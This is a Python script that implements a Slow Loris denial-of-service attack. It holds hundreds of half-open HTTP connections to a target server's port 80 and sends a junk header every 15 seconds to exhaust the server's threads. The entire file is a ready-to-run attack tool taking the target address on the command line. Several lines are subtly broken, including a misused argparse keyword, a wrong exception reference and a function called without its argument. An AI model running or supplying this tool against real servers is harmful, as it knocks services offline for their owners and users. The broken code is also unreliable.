#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
This is a simple python implementation of slow loris attack.
Slow Loris only works on Apache servers, since it pops a thread for every new
client.
"""

import time
import socket
import random
import argparse


#Headers to be sent at the beginning of the connection
HEADERS = [
    b"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;\
      rv:49.0) Gecko/20100101 Firefox/49.0",
    b"Accept-language: en-US,en,q=0.5",
]

def socket_error(sock):
    """ Handles a socket error: kill the socket. """
    print("Socket error, killing socket")
    sock.close()
    sock = None
    return sock


def init_socket(ip_address):
    """ Inits a socket and sends the first headers. It also sends the start
    of the request.
    """
    sock = socket.create_connection((ip_address, 80), timeout=4)

    if sock:
        try:
            sock.send(b"GET /?%d HTTP/1.1\r\n" %random.randint(0,5000))
            for header in HEADERS:
                sock.send(header)
        except sock.error:
                sock = socket_error()
    return sock

def send_header(sock):
    """ Sends a chunk of header to the server to keep it waiting.
    """
    if sock:
        try:
            value = random.randint(1,5000)
            sock.send(b"X-a: %d\r\n" % value)
        except socket.error as error:
            print("Socket error:\n%s\n killing socket" % error)
            sock.close()
            LIST_OF_SOCKETS.remove(sock)

def slow_loris(ip_address, sock_number=200):
    """ Implements the attack. Creates the given number of sockets, and manages
    it, recreating socket if necessary.
    It assumes that the ip is not none, and that sock_number is a positive
    number.
    """
    for _ in range(sock_number):
        sock = init_socket(ip_address)
        if sock:
            LIST_OF_SOCKETS.append(sock)
            print("Created socket %d" % len(LIST_OF_SOCKETS))

    while True:
        for sock in LIST_OF_SOCKETS:
            send_header(sock)
        for _ in range(sock_number - len(LIST_OF_SOCKETS)):
            sock = init_socket(ip_address)
            if sock:
                LIST_OF_SOCKETS.append(sock)
                print("Recreating socket...")
        time.sleep(15)
    return 0

if __name__ == "__main__":

    # Manages the list of sockets
    LIST_OF_SOCKETS = []

    DESCRIPTION = "Attacks the web server at the given IP \
                   with the Slow Loris attack"
    PARSER = argparse.ArgumentParser(description=DESCRIPTION)
    PARSER.add_argument(
        "ip",
        type=str,
        action="store",
        metavar="ADDRESS",
        help="The address or hostname to attack"
    )
    PARSER.add_argument(
        "-n", "--number",
        description="Number of sockets to open (default=200)",
        action="store",
        type=int
    )

    ARGS = PARSER.parse_args()
    slow_loris(ARGS.ip, ARGS.number)
